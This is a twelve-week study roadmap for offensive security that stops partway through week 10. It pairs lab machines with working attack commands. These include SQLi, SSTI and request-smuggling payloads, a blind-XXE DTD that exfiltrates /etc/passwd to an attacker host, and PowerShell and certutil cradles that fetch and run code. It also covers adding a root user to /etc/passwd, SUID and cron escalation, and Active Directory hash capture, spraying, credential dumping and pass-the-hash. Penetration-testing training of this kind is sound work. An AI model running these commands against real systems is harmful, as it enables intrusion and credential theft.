# Cybersecurity: 12-Week Hardcore Offensive Security Roadmap

> **100% Free. Local-First. Zero Fluff.**  
> Prerequisites: 5+ years Linux experience, basic networking (TCP/IP, DNS, HTTP).  
> No paid platforms. No certificate chasing. Manual exploitation over automation.

---

## Technical Pillars

| # | Domain | Focus |
|---|--------|-------|
| 1 | **Network Enumeration** | Nmap NSE, HackTricks methodology, protocol-specific probing |
| 2 | **Web Hacking** | PortSwigger Server-Side labs, manual SQLi, SSRF, XXE |
| 3 | **Privilege Escalation** | Manual checks, GTFOBins, LOLBAS, LinPEAS/WinPEAS analysis |
| 4 | **Active Directory** | Manual exploitation, Kerberos abuse, Impacket, BloodHound logic |
| 5 | **Exploitation** | Exploit-DB modification, manual reverse shells, BoF fundamentals |

---

## Lab Environment Setup

Before starting, build your local lab:

```bash
# Install VirtualBox + Vagrant
sudo apt install virtualbox virtualbox-ext-pack
sudo apt install vagrant

# Isolated attack network
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Attacker VM: Kali Linux (latest ISO from kali.org/get-kali)
# Target VMs: VulnHub .ova files (imported via VirtualBox)
```

**Essential tools (install on Kali):**
```bash
sudo apt install -y nmap gobuster ffuf feroxbuster nikto sqlmap \
  impacket-scripts bloodhound neo4j crackmapexec evil-winrm \
  responder john hashcat seclists wordlists pwndbg gdb pwntools \
  mingw-w64 wine python3-pwntools

pip3 install impacket
```

---

## Week 1 — Network Enumeration: Nmap Mastery & Service Fingerprinting

### Theory
- Nmap official book (free): https://nmap.org/book/
  - Focus: Chapter 5 (port scanning techniques & algorithms), Chapter 7 (service/version detection), Chapter 8 (OS detection), Chapter 9 (NSE scripting)
- HackTricks Network Services: https://book.hacktricks.xyz/network-services-pentesting
  - Read every service entry (FTP, SMB, SMTP, SNMP, LDAP, RPC)
- Nmap NSE script categories: `ls /usr/share/nmap/scripts/ | grep -E "vuln|exploit|brute"`

### Action
**VulnHub Machines:**
- **Kioptrix Level 1** (kioptrix.com) — classic SMB/Samba exploitation, OSCP-style

```bash
# Full enumeration workflow
nmap -sV -sC -O -p- --min-rate 5000 -oA full_scan <TARGET>
nmap -sU --top-ports 200 -oA udp_scan <TARGET>

# NSE targeted scripts
nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-enum-shares,smb-enum-users <TARGET>
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <TARGET>
nmap -p 25 --script smtp-enum-users,smtp-open-relay,smtp-commands <TARGET>
nmap -p 161 -sU --script snmp-brute,snmp-info,snmp-interfaces,snmp-processes <TARGET>

# Firewall bypass techniques
nmap -f -D RND:10 -sS --data-length 25 <TARGET>         # fragmentation + decoys
nmap --source-port 53 -sS <TARGET>                       # spoof source port
nmap -sA <TARGET>                                        # ACK scan to map firewall rules
```

### Key Commands
```bash
nmap -p- -sV --script=banner <TARGET>                    # banner grab all ports
nmap --script-help smb-vuln-*                            # review NSE script args
nmap -sV --version-intensity 9 <TARGET>                  # aggressive version detection
nmap -sL <CIDR>                                          # list scan (no packets)
nmap -sn <CIDR>                                          # host discovery only
```

**IppSec Reference:** [Kioptrix 1 walkthrough — SMB enumeration methodology](https://www.youtube.com/c/ippsec)

### Packet Analysis Challenge

Capture your own Nmap scans with Wireshark or tcpdump and observe TCP flags at the wire level. This is essential for understanding what a target (or IDS) sees when you scan.

```bash
# Capture traffic to/from target while running Nmap
sudo tcpdump -i eth0 host <TARGET> -w /tmp/week1_scan.pcap

# Open interactively in Wireshark:
wireshark /tmp/week1_scan.pcap &

# Or inspect quickly in terminal:
tcpdump -r /tmp/week1_scan.pcap -nn -q | head -50
```

**TCP flag behaviour per scan type:**

| Scan | Nmap Flag | Probe Packet | Open Port | Closed Port | Filtered |
|------|-----------|--------------|-----------|-------------|----------|
| SYN Stealth | `-sS` | `SYN` | `SYN/ACK` → attacker replies `RST` | `RST/ACK` | No reply or ICMP unreachable |
| TCP Connect | `-sT` | Full handshake: `SYN` → `SYN/ACK` → `ACK` | Normal 3-way handshake then `RST` | `RST/ACK` | No reply or ICMP unreachable |
| ACK | `-sA` | `ACK` | `RST` (unfiltered — stateless firewall) | `RST` | No reply (stateful firewall drops it) |
| NULL | `-sN` | No flags (all zero) | No reply | `RST/ACK` | No reply |
| FIN | `-sF` | `FIN` | No reply | `RST/ACK` | No reply |
| Xmas | `-sX` | `FIN + PSH + URG` | No reply | `RST/ACK` | No reply |
| UDP | `-sU` | UDP datagram | No reply or app reply | ICMP type 3 / code 3 (port unreachable) | ICMP type 3 / code 1,2,9,10,13 |

**Essential Wireshark display filters:**
```
tcp.flags.syn == 1 && tcp.flags.ack == 0      # all SYN probes (scan traffic)
tcp.flags.reset == 1                           # all RST responses (closed/rejected ports)
icmp.type == 3                                 # ICMP port unreachable (filtered ports/UDP)
tcp.analysis.retransmission                    # dropped packets → filtered ports
ip.src == <TARGET> && tcp.flags.syn == 1 && tcp.flags.ack == 1   # SYN/ACK responses (open TCP)
```

**Key insight:** A SYN scan (`-sS`) is historically called "stealthy" because the attacker never completes the three-way handshake — older application-level logging only recorded completed connections. Modern IDS/SIEM solutions and stateful firewalls log SYN packets regardless, so `-sS` is stealthy relative to `-sT` only in legacy environments. A full connect scan (`-sT`) always appears in server logs as a normal connection attempt.

---

## Week 2 — Network Enumeration: Protocol Deep-Dives & Manual Exploitation

### Theory
- HackTricks SMB: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
- HackTricks RPC/MSRPC: https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc
- HackTricks LDAP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
- RFC 1157 (SNMP v1/v2c): https://datatracker.ietf.org/doc/html/rfc1157

### Action
**VulnHub Machines:**
- **Kioptrix Level 2** — SQL injection + command injection chain
- **DC-1 (Drupal)** — CMS enumeration, service fingerprinting

```bash
# SMB enumeration without Metasploit
smbclient -L //<TARGET>/ -N
smbclient //<TARGET>/SHARENAME -N
rpcclient -U "" -N <TARGET>
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> querydominfo
enum4linux-ng -A <TARGET>

# LDAP enumeration (unauthenticated)
ldapsearch -x -H ldap://<TARGET> -b "DC=domain,DC=local"
ldapsearch -x -H ldap://<TARGET> -b "" -s base "(objectClass=*)" namingContexts

# SNMP extraction
snmpwalk -v2c -c public <TARGET>
snmpwalk -v2c -c public <TARGET> 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v2c -c public <TARGET> 1.3.6.1.2.1.25.6.3.1.2  # installed software
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <TARGET>

# NFS enumeration
showmount -e <TARGET>
mount -t nfs <TARGET>:/share /mnt/nfs -o nolock
```

### Key Commands
```bash
nmap -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs <TARGET>
nmap -p 111 --script rpcinfo <TARGET>
nbtscan -r <CIDR>
```

**IppSec Reference:** Search "ippsec smb enumeration" or "ippsec enum4linux" on YouTube

### Packet Analysis Challenge

Capture protocol traffic during enumeration and inspect it at the wire level. The ability to read raw packets separates methodology from tooling dependency.

```bash
# Capture SMB, LDAP, and SNMP traffic simultaneously
sudo tcpdump -i eth0 host <TARGET> and \( port 445 or port 389 or port 161 \) -w /tmp/week2_protos.pcap

# Quick terminal review (no GUI)
tcpdump -r /tmp/week2_protos.pcap -nn -A | less

# Decode SNMP community strings directly from pcap
tcpdump -r /tmp/week2_protos.pcap -nn -v port 161 | grep -i "community"
```

**SMB Handshake — TCP 445 (`smb2` or `smb` Wireshark filter):**
- `NEGOTIATE Protocol Request` → client advertises supported SMB dialects (SMBv1/2/3)
- `NEGOTIATE Protocol Response` → server selects dialect; note: if SMBv1 is accepted, MS17-010 may apply
- `SESSION_SETUP Request` → NTLM `NEGOTIATE` token embedded; server replies with `CHALLENGE` token
- Look for `NTLMSSP_NEGOTIATE` followed by `NTLMSSP_CHALLENGE` — the challenge blob is what Responder poisons to capture crackable NTLMv2 hashes
- Wireshark filter: `ntlmssp` to isolate all NTLM authentication frames

**LDAP Traffic — TCP/UDP 389 (`ldap` Wireshark filter):**
- `bindRequest` with empty credentials → unauthenticated bind attempt; success means the server allows anonymous enumeration
- `bindRequest` with `authType: simple` → **plaintext credentials** sent on the wire (no TLS); always flag in a report
- `searchRequest` frames reveal the base DN (`DC=domain,DC=local`) and what attributes are queried (`sAMAccountName`, `memberOf`, `userPrincipalName`)
- Wireshark filter: `ldap.messageID` to follow a complete request/response exchange

**SNMP — UDP 161 (`snmp` Wireshark filter):**
- Community strings are **plaintext** in SNMPv1 and SNMPv2c — visible in the `community` field of every PDU
- `GetRequest` / `GetNextRequest` / `GetBulkRequest` → your enumeration queries; responses contain raw OID values
- A `GetResponse` to OID `1.3.6.1.2.1.25.4.2.1.2` returns the running process list; `1.3.6.1.2.1.25.6.3.1.2` returns installed software
- Wireshark filter: `snmp.community == "public"` to find default community strings

**LLMNR/NBT-NS poisoning — Wireshark filters for Responder analysis:**
```
llmnr          # Link-Local Multicast Name Resolution requests (poisonable)
nbns           # NetBIOS Name Service broadcasts (poisonable)
ntlmssp        # Captures the NTLM exchange after poisoning — shows NTLMv2 hash material
```

---

## Week 3 — Web Hacking: Server-Side Injection Fundamentals

### Theory
  - SQL injection: all apprentice + practitioner labs
  - Path traversal: all apprentice + practitioner labs
  - OS command injection: all apprentice + practitioner labs
- OWASP Testing Guide v4.2 (free PDF): https://owasp.org/www-project-web-security-testing-guide/
  - Section 4.7: Input Validation Testing

### Action
**PortSwigger Free Labs (no subscription required):**
- SQL injection:
  - [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
  - [SQL injection UNION attack, determining the number of columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
  - [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
  - [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
  - [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
  - [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
- OS command injection:
  - [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
  - [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
  - [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

**VulnHub Machine:**
- **bWAPP** — isolated web app lab, enable SQLi and command injection modules

```bash
# Manual SQLi detection
' OR '1'='1
' OR '1'='1'--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# UNION-based SQLi: column count + data type
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

# Extract DB metadata (MySQL)
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

# Blind SQLi: boolean-based
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--

# Blind SQLi: time-based (MySQL)
' AND SLEEP(5)--
# Blind SQLi: time-based (SQL Server)
'; IF(1=1) WAITFOR DELAY '00:00:05'; --

# Path traversal
curl "http://<TARGET>/file?filename=../../../etc/passwd"
curl "http://<TARGET>/file?filename=....//....//....//etc/passwd"    # bypass filter
curl "http://<TARGET>/file?filename=%2e%2e%2f%2e%2e%2fetc/passwd"   # URL encode
```

### Key Commands
```bash
# Burp Suite (free community edition) - intercept and repeat
# Launch: burpsuite &
# Manual header injection via curl:
curl -v -X POST "http://<TARGET>/login" \
  -d "username=admin'--&password=x" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**IppSec Reference:** Search "ippsec sql injection manual" or "ippsec bWAPP" on YouTube

---

## Week 4 — Web Hacking: SSRF, XXE & File Upload Bypass

### Theory
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- PortSwigger File Upload: https://portswigger.net/web-security/file-upload
- HackTricks SSRF: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### Action
**PortSwigger Free Labs:**
- SSRF:
  - [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
  - [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
  - [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
  - [SSRF via the Referer header](https://portswigger.net/web-security/ssrf/lab-ssrf-via-referer-header)
- XXE:
  - [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
  - [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
  - [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
- File Upload:
  - [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
  - [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
  - [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

**VulnHub Machine:**
- **Typhoon v1.02** — multiple web vulnerabilities including file upload

```bash
# SSRF payloads
http://localhost/admin
http://127.0.0.1:22
http://169.254.169.254/latest/meta-data/            # AWS metadata
http://[::]:80/                                     # IPv6 loopback
http://0x7f000001/                                  # hex IP bypass
http://017700000001/                                # octal IP bypass
dict://localhost:11211/stat                         # Redis via SSRF

# XXE: read /etc/passwd
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

# XXE: blind SSRF via external DTD
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<ATTACKER>/evil.dtd">
  %xxe;
]>
<root/>

# File upload bypass techniques
# 1. Change Content-Type: image/jpeg but upload PHP
# 2. Double extension: shell.php.jpg
# 3. Null byte: shell.php%00.jpg
# 4. Case variation: shell.PHP, shell.pHp
# 5. Upload .htaccess to enable PHP execution:
echo "AddType application/x-httpd-php .jpg" > .htaccess
```

### Key Commands
```bash
# Host malicious DTD for blind XXE
python3 -m http.server 8080

# evil.dtd content:
# <!ENTITY % data SYSTEM "file:///etc/passwd">
# <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://<ATTACKER>/?data=%data;'>">
# %param1; %exfil;
```

**IppSec Reference:** Search "ippsec xxe" or "ippsec file upload bypass" on YouTube

---

## Week 5 — Web Hacking: Authentication Bypass & Access Control

### Theory
- PortSwigger Authentication: https://portswigger.net/web-security/authentication
- PortSwigger Access Control: https://portswigger.net/web-security/access-control
- PortSwigger Insecure Deserialization: https://portswigger.net/web-security/deserialization
- JWT attacks: https://portswigger.net/web-security/jwt

### Action
**PortSwigger Free Labs:**
- Authentication:
  - [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
  - [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
  - [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
  - [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
  - [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
- Access Control:
  - [Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)
  - [User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)
  - [User ID controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)
  - [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
  - [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
- Deserialization:
  - [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
  - [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
  - [Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

**VulnHub Machine:**
- **DVWA (Damn Vulnerable Web Application)** — authentication bypass + CSRF modules

```bash
# Username enumeration: timing attack
for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do
  time curl -s -o /dev/null -w "%{time_total} $user\n" \
    -X POST http://<TARGET>/login \
    -d "username=$user&password=wrongpassword"
done 2>&1 | sort -n

# JWT manipulation (none algorithm attack)
# Decode: base64 -d <<< "<header>.<payload>"
# Change alg to "none", remove signature
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
echo '{"sub":"admin","role":"admin"}' | base64 | tr -d '='
# Reassemble: header.payload. (empty signature)

# IDOR: parameter tampering
curl -s "http://<TARGET>/account?id=1"
curl -s "http://<TARGET>/account?id=2"      # increment to access other accounts

# HTTP method override
curl -X POST -H "X-HTTP-Method-Override: DELETE" "http://<TARGET>/admin/user/1"
```

### Key Commands
```bash
# Brute force login with custom wordlist
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# gobuster directory + file discovery
gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -x php,txt,html,bak -t 50 -o gobuster_results.txt
```

**IppSec Reference:** Search "ippsec authentication bypass" or "ippsec deserialization" on YouTube

---

## Week 6 — Web Hacking: Advanced Injection & Template Engines

### Theory
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- PortSwigger HTTP Request Smuggling: https://portswigger.net/web-security/request-smuggling
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

### Action
**PortSwigger Free Labs:**
- SSTI:
  - [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
  - [Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
  - [Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
  - [Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
- Request Smuggling:
  - [HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
  - [HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

**VulnHub Machine:**
- **FluxCapacitor** — SSTI and filter bypass challenge
- **Chatterbox** — Windows web exploitation

```bash
# SSTI detection polyglot
${{<%['"}}%\.

# Jinja2 (Python/Flask) RCE
{{7*7}}                                                    # confirm execution
{{config}}                                                 # dump config
{{''.__class__.__mro__[1].__subclasses__()}}               # enumerate classes
# Find subprocess.Popen index N, then:
{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}

# Twig (PHP) RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# HTTP Smuggling: CL.TE
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 6
Transfer-Encoding: chunked

0

G

# HTTP Smuggling: TE.CL
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### Key Commands
```bash
# ffuf for parameter fuzzing (SSTI injection point discovery)
ffuf -u "http://<TARGET>/page?name=FUZZ" \
  -w /usr/share/seclists/Fuzzing/template-engines-special-vars.txt \
  -fs <NORMAL_RESPONSE_SIZE>

# Content-Type fuzzing
ffuf -u "http://<TARGET>/api" -X POST \
  -H "Content-Type: FUZZ" \
  -w /usr/share/seclists/Fuzzing/content-type.txt \
  -d '{"key":"value"}'
```

**IppSec Reference:** Search "ippsec SSTI" or "ippsec template injection" on YouTube

---

## Week 7 — Privilege Escalation: Linux Manual Enumeration

### Theory
- GTFOBins: https://gtfobins.github.io/ — every binary with sudo/SUID/capabilities abuse
- HackTricks Linux PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings Linux PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Kernel exploit research: https://github.com/SecWiki/linux-kernel-exploits

### Action
**VulnHub Machines:**
- **Lin.Security** — designed specifically for Linux PrivEsc techniques
- **SickOS 1.1** — OSCP-like, multiple PrivEsc paths

```bash
# === MANUAL ENUMERATION CHECKLIST ===

# System information
uname -a && cat /proc/version && cat /etc/os-release
cat /etc/crontab && ls -la /etc/cron* && crontab -l
cat /etc/passwd | grep -v "nologin\|false"
cat /etc/group

# SUID/SGID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# World-writable files and directories
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# Sudo rights
sudo -l

# Running processes (look for root processes)
ps aux | grep root
ps -ef --forest

# Network connections
ss -tlnp
netstat -tlnp 2>/dev/null
cat /etc/hosts

# Passwords in files
grep -r "password" /etc 2>/dev/null
grep -r "password" /var/www 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Writable /etc/passwd (add root user)
openssl passwd -1 -salt salt 'password123'
echo 'hacker:$1$salt$...<HASH>...:0:0:root:/root:/bin/bash' >> /etc/passwd

# PATH hijacking
echo $PATH
# Check if any path in sudo env is writable:
find $(echo $PATH | tr ':' ' ') -writable 2>/dev/null

# NFS no_root_squash
cat /etc/exports
# If no_root_squash: mount from attacker, create SUID binary
showmount -e <TARGET>
mount -t nfs <TARGET>:/share /mnt/nfs -o nolock
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
/mnt/nfs/bash -p
```

### Key Commands
```bash
# LinPEAS: download and run (do NOT blindly trust output — read and analyze)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Read LinPEAS output critically:
# RED/YELLOW = critical findings
# Focus on: SUID binaries, sudo -l, cron jobs, capabilities, writable paths

# Cron job exploitation
# If script in cron is writable:
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# Wait for cron execution, then: /bin/bash -p
```

**IppSec Reference:** Search "ippsec lin.security" or "ippsec linux privilege escalation" on YouTube

---

## Week 8 — Privilege Escalation: Windows Manual Enumeration

### Theory
- LOLBAS: https://lolbas-project.github.io/ — Living Off the Land Binaries
- HackTricks Windows PrivEsc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings Windows PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

### Action
**VulnHub Machines:**
- **SkyTower** — Windows-adjacent techniques
- **Brainpan 1** — Windows buffer overflow + PrivEsc

```bash
# === WINDOWS MANUAL ENUMERATION (cmd.exe / PowerShell) ===

# System info
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn    # installed patches
whoami /all
net user
net localgroup administrators
net localgroup

# Service vulnerabilities
sc qc <SERVICENAME>
sc query
wmic service list brief | findstr /i "running"
# Unquoted service paths:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# AlwaysInstallElevated check
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Registry stored credentials
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task\|run as\|run\|status"

# DLL hijacking search
# Find services with writable directories in PATH:
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a

# Token impersonation (check for SeImpersonatePrivilege)
whoami /priv
# If SeImpersonatePrivilege: use PrintSpoofer or GodPotato
# PrintSpoofer: .\PrintSpoofer.exe -i -c "cmd.exe"
# GodPotato: .\GodPotato.exe -cmd "cmd /c whoami"
```

### Key Commands
```bash
# WinPEAS: transfer to target and execute
# From Kali: python3 -m http.server 8080
# On Windows target:
certutil -urlcache -split -f http://<ATTACKER>/winPEAS.exe winPEAS.exe
.\winPEAS.exe

# PowerShell download cradle (alternative)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/winPEAS.ps1')"
```

**IppSec Reference:** Search "ippsec windows privilege escalation" or "ippsec brainpan" on YouTube

---

## Week 9 — Active Directory: Enumeration & Initial Compromise

### Theory
- The Hacker Recipes AD: https://www.thehacker.recipes/ad/
- HackTricks Active Directory: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- PayloadsAllTheThings AD: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- Kerberos in depth: https://web.mit.edu/kerberos/krb5-latest/doc/
- **Tool repos:**
  - Impacket: https://github.com/fortra/impacket
  - BloodHound CE: https://github.com/SpecterOps/BloodHound
  - Responder: https://github.com/lgandx/Responder
  - CrackMapExec / NetExec: https://github.com/Pennyw0rth/NetExec
  - evil-winrm: https://github.com/Hackplayers/evil-winrm

### Action
**VulnHub Machines:**
- **Vulnhub AD Lab (Offshore)** — full AD environment
- **HackTheBox (free tier):** Forest, Sauna, Active — classic AD boxes

**Local AD Lab Setup:**
```bash
# Windows Server 2019 Evaluation (180-day free trial from Microsoft)
# Download: www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019
# Create VM, promote to DC, add users/groups

# From Kali — AD Enumeration without credentials:
# LLMNR/NBT-NS poisoning with Responder
sudo responder -I eth0 -wF
# Capture NTLMv2 hashes, crack with hashcat:
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (no pre-auth required accounts)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
# Crack AS-REP hash:
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With credentials — Kerberoasting
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# BloodHound data collection
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c all
# Import JSON to BloodHound, run queries:
# "Find all Domain Admins"
# "Shortest Path to Domain Admins"
# "Find Kerberoastable Users"
# "Find AS-REP Roastable Users"

# LDAP enumeration with credentials
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASS>' \
  -b "DC=<DOMAIN>,DC=local" "(objectClass=user)" sAMAccountName memberOf
```

### Key Commands
```bash
# CrackMapExec: Swiss army knife for AD
crackmapexec smb <CIDR> -u <USER> -p <PASS>             # spray credentials
crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam     # dump SAM
crackmapexec smb <TARGET> -u <USER> -p <PASS> --lsa     # dump LSA

# Password spraying (avoid lockout)
crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --no-bruteforce
```

**IppSec Reference:** Search "ippsec forest" or "ippsec active directory kerberoasting" on YouTube

---

## Week 10 — Active Directory: Lateral Movement & Domain Compromise

### Theory
- Pass-the-Hash/Ticket attacks: https://www.thehacker.recipes/ad/movement/ntlm
- DCSync attack: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
- Golden/Silver Ticket: https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets
- ACL-based attacks: https://www.thehacker.recipes/ad/movement/dacl
- **Tunneling/pivoting tool repos:**
  - Chisel (TCP/UDP tunnel over HTTP): https://github.com/jpillora/chisel
  - Ligolo-ng (reverse tunnel via TUN interface): https://github.com/nicocha30/ligolo-ng

### Action
**VulnHub / HTB Machines (free tier):**
- **HackTheBox (free): Active** — GPP password + Kerberoasting
- **HackTheBox (free): Monteverde** — Azure AD Connect abuse

```bash
# Pass-the-Hash (no plaintext password needed)
impacket-psexec <DOMAIN>/<ADMIN>@<TARGET> -hashes :<NT_HASH>
evil-winrm -i <TARGET> -u <USER> -H <NT_HASH>
crackmapexec smb <TARGET> -u <USER> -H <NT_HASH>

